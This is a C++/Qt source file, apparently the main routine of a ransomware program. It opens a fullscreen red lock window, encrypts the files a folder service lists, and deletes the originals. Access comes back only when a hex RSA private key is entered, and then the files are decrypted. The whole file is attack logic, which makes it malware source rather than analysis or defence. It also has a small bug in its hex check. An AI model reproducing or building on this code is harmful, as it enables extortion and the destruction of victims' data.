#include <QApplication>
#include <iostream>
#include "service/rsaencryptor.h"
#include "view/screenblocker.h"
#include "service/Folderservice.h"

using namespace boost::filesystem;

bool is_hexa(const std::string& s)
{
    return !s.empty() && std::find_if(s.begin(),
        s.end(), [](unsigned char c) {
        return !std::isdigit(c)
                && c != 'A' && c != 'A'
                && c != 'B' && c != 'b'
                && c != 'C' && c != 'c'
                && c != 'D' && c != 'd'
                && c != 'E' && c != 'e'
                && c != 'F' && c != 'f'; }) == s.end();
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    ScreenBlocker* screenBlocker = new ScreenBlocker();
    // Set the main window
    screenBlocker->setWindowTitle("My Window");
    screenBlocker->setStyleSheet("background-color: red;");
    // Show the window in fullscreen
    screenBlocker->showFullScreen();

    bool unblock = false;
    std::string key = "";

    FolderService folderservice;
    RSAEncryptor* encryptor = new RSAEncryptor();

    if(argc == 2) {
        key = argv[1];
        if(!is_hexa(key)) {
            std::cout<<"Wrong key type!"<<std::endl;
            exit(0);
        }

        encryptor->checkPrivateKey(key);

        std::vector<std::string> files = folderservice.list_files_for_decryption();

        for (std::string& filePath : files) {
            encryptor->decryptFile(filePath, key);
        }

        exit(0);
    }

    std::vector<std::string> files = folderservice.list_files_for_encryption();

    for (std::string& filePath : files) {
        encryptor->encryptFile(filePath);

        try {
            remove(filePath);
        } catch(std::exception const&  ex) {
            std::cout<<ex.what()<<std::endl;
        }
    }

    while(!unblock) {
        screenBlocker->show();
        a.exec();

        QString Qkey = screenBlocker->getKey();

        if(Qkey != nullptr) {
            key = Qkey.toStdString();
        }

        if(!is_hexa(key)) {
            std::cout<<"Wrong key type!"<<std::endl;
            unblock = false;
        } else {
            try {
                encryptor->checkPrivateKey(key);

                std::vector<std::string> files = folderservice.list_files_for_decryption();

                for (std::string& filePath : files) {
                    encryptor->decryptFile(filePath, key);

                    try {
                        remove(filePath);
                    } catch(std::exception const&  ex) {
                        std::cout<<ex.what()<<std::endl;
                    }
                }
                unblock = true;

            } catch(SignatureVerificationFilter::SignatureVerificationFailed keyVerifFailedException) {
                std::cout<<"[KEY-ERROR]"<<keyVerifFailedException.what()<<std::endl;
                screenBlocker->clearKey();
                unblock = false;
            } catch(Exception ex) {
                std::cout<<"[DECRYPTION-ERROR] Error when decrypting files: "<<ex.what()<<std::endl;
                screenBlocker->clearKey();
                unblock = false;
            }
        }
    }

    delete encryptor;
    return 0;
}
